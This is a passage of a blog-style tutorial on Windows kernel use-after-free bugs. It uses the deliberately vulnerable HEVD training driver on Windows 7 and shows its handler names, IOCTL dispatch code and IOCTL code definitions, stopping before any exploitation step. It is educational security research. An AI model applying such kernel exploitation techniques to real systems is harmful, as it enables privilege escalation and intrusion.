@@ -1,0 +1,844 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>0x02 - Introduction to Windows Kernel Use After Frees (UaFs) // </title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0x02 - Introduction to Windows Kernel Use After Frees (UaFs)">
+  <meta name="twitter:description" content="If you’ve been following the series consecutively, by now you should have exploited a basic Stack Overflow both within Windows 7 (x86) and Windows 10 (x64). Although this is a major accomplishment there are more vulnerabilities that can result in code execution. The best way to get familiar with them is to exploit them on a system with minimal mitigations. For this reason, we’ll be returning back to Windows 7 (x86).">
+
+    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x02-introduction-to-windows-kernel-uafs/">
+  <meta property="og:site_name" content="wetw0rk">
+  <meta property="og:title" content="0x02 - Introduction to Windows Kernel Use After Frees (UaFs)">
+  <meta property="og:description" content="If you’ve been following the series consecutively, by now you should have exploited a basic Stack Overflow both within Windows 7 (x86) and Windows 10 (x64). Although this is a major accomplishment there are more vulnerabilities that can result in code execution. The best way to get familiar with them is to exploit them on a system with minimal mitigations. For this reason, we’ll be returning back to Windows 7 (x86).">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-12-14T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-12-14T00:00:00+00:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
+      <span class="app-header-title"></span>
+      <p> </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">0x02 - Introduction to Windows Kernel Use After Frees (UaFs)</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Dec 14, 2024
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          16 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>If you&rsquo;ve been following the series consecutively, by now you should have exploited a basic Stack Overflow both within Windows 7 (x86) and Windows 10 (x64). Although this is a major accomplishment there are more vulnerabilities that can result in code execution. The best way to get familiar with them is to exploit them on a system with minimal mitigations. For this reason, we&rsquo;ll be returning back to Windows 7 (x86).</p>
+<p>In addition, we won&rsquo;t be utilizing Ghidra, this time we&rsquo;ll be using the source code. In the next guide we&rsquo;ll re-introduce Ghidra to give you a valuable perspective on how you would identify it using either source or decompiler output.</p>
+<h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#what-is-a-use-after-free-high-level">What is a Use After Free (High Level)</a></li>
+<li><a href="#using-source---getting-a-lay-of-the-land">Using Source - Getting a Lay of the Land</a>
+<ul>
+<li><a href="#understanding-allocateuafobjectnonpagedpoolioctlhandler">Understanding AllocateUaFObjectNonPagedPoolIoctlHandler</a></li>
+<li><a href="#understanding-useuafobjectnonpagedpoolioctlhandler">Understanding UseUaFObjectNonPagedPoolIoctlHandler</a></li>
+<li><a href="#understanding-allocatefakeobjectnonpagedpoolioctlhandler">Understanding AllocateFakeObjectNonPagedPoolIoctlHandler</a></li>
+</ul>
+</li>
+<li><a href="#summary-of-functions">Summary of Functions</a></li>
+<li><a href="#exploitation">Exploitation</a></li>
+<li><a href="#sources">Sources</a></li>
+</ul>
+<h1 id="what-is-a-use-after-free-high-level">What is a Use After Free (High Level)</h1>
+<p>Just in case you’re not completely familiar with what a Use-After-Free is, let’s give ourselves a quick high-level overview of this bug class. Basically, a Use After Free (UaF) occurs when we <strong>Use</strong> an object <strong>After</strong> it has been <strong>Free</strong>’d. This “object” can be any structure or class loaded in memory that is later freed.</p>
+<p>To use a non-technical example, let&rsquo;s say you&rsquo;re working under a car and place your tools beside you. You&rsquo;re working upside down so you&rsquo;re not paying attention to your toolbox, you just simply reach into the toolbox and feel around for what you need.</p>
+<p><img src="/0x02-Introduction-to-Windows-Kernel-Use-After-Frees/uaf-example1.png" alt="alt text"></p>
+<p>In this &ldquo;toolbox&rdquo; you only have a wrench (hard to believe I know), you grab the wrench but instead of putting it back in the toolbox you place it on the floor near your feet. Although at your feet, you believe the wrench has been placed back in its original location.</p>
+<p>Without you noticing some dude throws a can of soda into the toolbox.</p>
+<p><img src="/0x02-Introduction-to-Windows-Kernel-Use-After-Frees/uaf-example2.png" alt="alt text"></p>
+<p>When you go and reach for the wrench you don&rsquo;t notice a difference between it and the can (because you have flippers, you’re a penguin). So, you end up dumping cola all over your new tux.</p>
+<p><img src="/0x02-Introduction-to-Windows-Kernel-Use-After-Frees/uaf-example3.png" alt="alt text"></p>
+<p>OH NO!! We have fallen victim to a UaF, the dude successfully exploited the UaF.</p>
+<p>How does this relate to computers?</p>
+<ul>
+<li>The example of blindly reaching into a toolbox mirrors the way programs rely on memory without &ldquo;looking&rdquo; (verifying if it&rsquo;s still valid or changed).</li>
+<li>The unexpected replacement of the wrench with a soda can demonstrates how stale references (pointers) can lead to unintended and harmful outcomes.</li>
+<li>The &ldquo;dude&rdquo; throwing a soda can represents an attacker taking advantage of freed memory (e.g., injecting malicious data/code into reused memory).</li>
+</ul>
+<p>With that we should be ready to get started.</p>
+<h1 id="using-source---getting-a-lay-of-the-land">Using Source - Getting a Lay of the Land</h1>
+<p>The first thing we want to identify is the location of the I/O Control Codes. From the looks of it, each vulnerability has its own &ldquo;handler&rdquo; function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.<span style="color:#f92672">/</span>ArbitraryWrite.c:<span style="color:#ae81ff">129</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Arbitrary Write Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>MemoryDisclosureNonPagedPool.c:<span style="color:#ae81ff">178</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Memory Disclosure NonPagedPool Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>DoubleFetch.c:<span style="color:#ae81ff">151</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Double Fetch Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>BufferOverflowNonPagedPool.c:<span style="color:#ae81ff">165</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Buffer Overflow NonPagedPool Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>MemoryDisclosureNonPagedPoolNx.c:<span style="color:#ae81ff">177</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Memory Disclosure NonPagedPoolNx Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>IntegerOverflow.c:<span style="color:#ae81ff">154</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Integer Overflow Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UninitializedMemoryPagedPool.c:<span style="color:#ae81ff">216</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Uninitialized Memory PagedPool Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>WriteNULL.c:<span style="color:#ae81ff">117</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Write NULL Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>InsecureKernelResourceAccess.c:<span style="color:#ae81ff">148</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Insecure Kernel File Access Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>BufferOverflowPagedPoolSession.c:<span style="color:#ae81ff">165</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Buffer Overflow PagedPoolSession Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>BufferOverflowNonPagedPoolNx.c:<span style="color:#ae81ff">165</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Buffer Overflow NonPagedPoolNx Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">352</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Allocate UaF Object NonPagedPool Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">376</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Use UaF Object NonPagedPool Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">400</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Free UaF Object NonPagedPool Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">424</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Allocate Fake Object NonPagedPool Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPoolNx.c:<span style="color:#ae81ff">352</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Allocate UaF Object NonPagedPoolNx Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPoolNx.c:<span style="color:#ae81ff">376</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Use UaF Object NonPagedPoolNx Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPoolNx.c:<span style="color:#ae81ff">400</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Free UaF Object NonPagedPoolNx Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPoolNx.c:<span style="color:#ae81ff">424</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Allocate Fake Object NonPagedPoolNx Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>BufferOverflowStack.c:<span style="color:#ae81ff">121</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Buffer Overflow Stack Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>ArbitraryReadWriteHelperNonPagedPoolNx.c:<span style="color:#ae81ff">553</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Create Arbitrary Read Write Helper Object Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>ArbitraryReadWriteHelperNonPagedPoolNx.c:<span style="color:#ae81ff">582</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Set Arbitrary Read Write Helper Object Name Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>ArbitraryReadWriteHelperNonPagedPoolNx.c:<span style="color:#ae81ff">611</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Get Arbitrary Read Write Helper Object Name Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>ArbitraryReadWriteHelperNonPagedPoolNx.c:<span style="color:#ae81ff">640</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Delete Arbitrary Read Write Helper Object Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UninitializedMemoryStack.c:<span style="color:#ae81ff">160</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Uninitialized Memory Stack Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>NullPointerDereference.c:<span style="color:#ae81ff">200</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Null Pointer Dereference Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>BufferOverflowStackGS.c:<span style="color:#ae81ff">121</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Buffer Overflow Stack GS Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>TypeConfusion.c:<span style="color:#ae81ff">213</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Type Confusion Ioctl Handler
+</span></span></span></code></pre></div><p>We&rsquo;re interested in the <code>UseAfterFreeNonPagedPool I/O Control Codes</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">352</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Allocate UaF Object NonPagedPool Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">376</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Use UaF Object NonPagedPool Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">400</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Free UaF Object NonPagedPool Ioctl Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.<span style="color:#f92672">/</span>UseAfterFreeNonPagedPool.c:<span style="color:#ae81ff">424</span><span style="color:#f92672">:</span><span style="color:#75715e">/// Allocate Fake Object NonPagedPool Ioctl Handler
+</span></span></span></code></pre></div><p>Based on the naming convention we can identify the following functions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">AllocateUaFObjectNonPagedPoolIoctlHandler</span>(
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">UseUaFObjectNonPagedPoolIoctlHandler</span>(
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FreeUaFObjectNonPagedPoolIoctlHandler</span>(
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">AllocateFakeObjectNonPagedPoolIoctlHandler</span>(
+</span></span></code></pre></div><p>If we trace where these function calls are used, we are led to <code>./HackSysExtremeVulnerableDriver.c</code> which contains a <a href="https://www.w3schools.com/c/c_switch.php">switch statement</a> that would allow us to trigger vulnerable functions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">294</span>         <span style="color:#66d9ef">case</span> HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">295</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">296</span>             Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">AllocateUaFObjectNonPagedPoolIoctlHandler</span>(Irp, IrpSp);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">297</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">298</span>             <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">299</span>         <span style="color:#66d9ef">case</span> HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">300</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>             Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">UseUaFObjectNonPagedPoolIoctlHandler</span>(Irp, IrpSp);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">302</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">303</span>             <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">304</span>         <span style="color:#66d9ef">case</span> HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">305</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">306</span>             Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">FreeUaFObjectNonPagedPoolIoctlHandler</span>(Irp, IrpSp);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">307</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">308</span>             <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">309</span>         <span style="color:#66d9ef">case</span> HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">310</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">311</span>             Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">AllocateFakeObjectNonPagedPoolIoctlHandler</span>(Irp, IrpSp);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">312</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">313</span>             <span style="color:#66d9ef">break</span>;
+</span></span></code></pre></div><p>This however still did not give us the <code>I/O Control Codes</code> so before trying to search within each file using some grep-fu, let&rsquo;s check the header file <code>HackSysExtremeVulnerableDriver.h</code>.</p>
+<p>Within it we are given a list of IOCTL Codes :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">81</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x800</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">82</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x801</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">83</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_ARBITRARY_WRITE                               <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x802</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">84</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL                <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x803</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">85</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x804</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">86</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x805</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">87</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x806</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">88</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL           <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x807</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">89</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_TYPE_CONFUSION                                <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x808</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">90</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_INTEGER_OVERFLOW                              <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x809</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">91</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_NULL_POINTER_DEREFERENCE                      <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x80A</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">92</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK                    <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x80B</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">93</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL               <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x80C</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">94</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_DOUBLE_FETCH                                  <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x80D</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">95</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS                   <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x80E</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">96</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL              <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x80F</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">97</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION            <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x810</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">98</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_WRITE_NULL                                    <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x811</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">99</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX             <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x812</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX           <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x813</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">101</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX         <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x814</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">102</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX              <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x815</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">103</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX             <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x816</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">104</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX        <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x817</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">105</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_CREATE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX    <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x818</span>)
